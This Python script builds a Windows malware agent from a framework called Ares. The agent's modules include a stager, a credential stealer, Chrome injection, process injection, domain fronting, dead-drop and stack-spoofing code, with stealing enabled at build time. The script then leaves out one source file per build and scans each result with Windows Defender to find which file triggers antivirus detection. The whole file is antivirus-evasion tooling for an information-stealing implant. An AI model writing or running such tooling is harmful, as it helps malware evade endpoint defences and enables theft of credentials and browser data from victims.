#!/usr/bin/env python3
"""
Binary search detection: compile subsets of STAGER_SRC to find which file triggers AV.
"""
import subprocess, os, sys

BUILD = r"C:\Users\Admin\.openclaw\workspace\Ares_Framework"
DEFENDER = r"C:\Program Files\Windows Defender\MpCmdRun.exe"
OUT = os.path.join(BUILD, "build", "av_test.exe")

CFLAGS = [
    "gcc", "-Wall", "-O2", "-s", "-mwindows", "-fno-ident",
    "-ffunction-sections", "-fdata-sections",
    "-Wno-format-truncation", "-Wno-stringop-truncation",
    "-Wno-unused-variable", "-Wno-unused-function",
    "-Wno-unused-but-set-variable", "-Wno-cpp", "-Wno-unknown-pragmas",
    "-Wno-format", "-Wno-incompatible-pointer-types",
    "-DCFG_XOR_KEY=0x5A", "-DARES_STAGER_STEAL",
    "-Wl,--gc-sections,--stack,4194304,--dynamicbase,--nxcompat",
    "-I."
]

SRCS = [
    "agent/native/stager.c",
    "agent/native/core.c",
    "agent/native/syscall.c",
    "agent/native/inject.c",
    "agent/native/stealer.c",
    "agent/native/chrome_v20.c",
    "agent/native/chrome_inject.c",
    "agent/native/bof_loader.c",
    "agent/native/domain_front.c",
    "agent/native/dead_drop.c",
    "agent/native/cap_loader.c",
    "agent/native/stack_spoof.c",
]

LIBS = ["-lkernel32", "-luser32", "-lws2_32", "-lgdi32", "-luuid"]
RESOURCES = "build/resources.o"

def build_and_scan(srcs):
    cmd = CFLAGS + ["-o", OUT] + srcs + [RESOURCES] + LIBS
    r = subprocess.run(cmd, cwd=BUILD, capture_output=True, text=True)
    if r.returncode != 0:
        return None  # build failed
    # Scan
    r2 = subprocess.run(
        [DEFENDER, "-Scan", "-ScanType", "3", "-File", OUT, "-DisableRemediation"],
        capture_output=True, text=True
    )
    detected = r2.returncode != 0
    size = os.path.getsize(OUT) // 1024
    return detected

def test(label, srcs):
    result = build_and_scan(srcs)
    if result is None:
        print(f"  {label}: BUILD FAILED")
        return False
    status = "DETECTED" if result else "CLEAN"
    print(f"  {label}: {status}")
    return result

print("[*] AV Binary Search")
print()

# Test each file individually (compile alone won't link, so test by EXCLUDING)
for i, src in enumerate(SRCS):
    subset = [s for j, s in enumerate(SRCS) if j != i]
    result = build_and_scan(subset)
    if result is None:
        print(f"  EXCLUDE {src}: BUILD FAILED (likely linker)")
    elif not result:
        print(f"  EXCLUDE {src}: CLEAN  <-- THIS FILE CAUSES DETECTION")
    else:
        print(f"  EXCLUDE {src}: still DETECTED")
